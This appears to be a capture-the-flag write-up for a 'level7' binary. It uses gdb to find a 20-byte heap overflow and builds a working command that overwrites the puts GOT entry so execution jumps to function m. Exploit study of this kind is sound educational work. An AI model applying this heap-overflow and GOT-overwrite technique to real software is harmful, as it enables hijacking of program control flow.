The `main` function expects 2 arguments - 2 simultaneous operations
get c value to be printed by m
execute m on hijacking the puts execution

1. Find the buffer size of the first `strcpy`.
In gdb :
```
(gdb) run AAA AAA
Starting program: /home/user/level7/level7 AAA AAA

Breakpoint 1, 0x080485a0 in main ()
(gdb) i r $eax
eax            0x804a018	134520856
(gdb) x /128x 0x804a018
0x804a018:	0x00000000	0x00000000	0x00000000	0x00000011
0x804a028:	0x00000002	0x0804a038	0x00000000	0x00000011
```
```
>>> int(hex(0x804a028 - 0x804a018), 16) + 4
20
```

2. Playing around
We can observe the overflow of the first `strcpy` in eax of the second one provocating a Segmentation fault.
```
Starting program: /home/user/level7/level7 $(python -c "print 'A' * 20 + 'BBBB'") $(python -c "print 'A'")

Breakpoint 1, 0x080485bd in main ()
(gdb) i r $eax
eax            0x42424242	1111638594
(gdb) c
Continuing.
Program received signal SIGSEGV, Segmentation fault.
0xb7eb18f3 in ?? () from /lib/i386-linux-gnu/libc.so.6
```
The 2nd `strcpy` tries to write the content of our argv[2] into the value of the first.

3. Use that observation to replace the address of `puts` with the address of `m`.
```
(gdb) x 0x8048400
   0x8048400 <puts@plt>:	0x992825ff
(gdb) disas 0x8048400
Dump of assembler code for function puts@plt:
  0x08048400 <+0>:	jmp    *0x8049928
  0x08048406 <+6>:	push   $0x28
  0x0804840b <+11>:	jmp    0x80483a0
End of assembler dump.
```
The address of `puts` is `0x8049928`.
```
(gdb) x m
0x80484f4 <m>:	0x83e58955
```
The address of `m` is `0x80484f4`.

Test :
```
Starting program: /home/user/level7/level7 $(python -c "print 'A' * 20 + '\x28\x99\x04\x08'") $(python -c "print '\xf4\x84\x04\x08'")

Breakpoint 1, 0x080485bd in main ()
(gdb) x 0x8049928
0x8049928 <puts@got.plt>:	0x08048406
(gdb) c
Continuing.

Breakpoint 2, 0x080485d3 in main ()
(gdb) x 0x8049928
0x8049928 <puts@got.plt>:	0x080484f4
```
It works !

4. Finally, in the terminal :
```
./level7 $(python -c "print 'A' * 20 + '\x28\x99\x04\x08'") $(python -c "print '\xf4\x84\x04\x08'")
```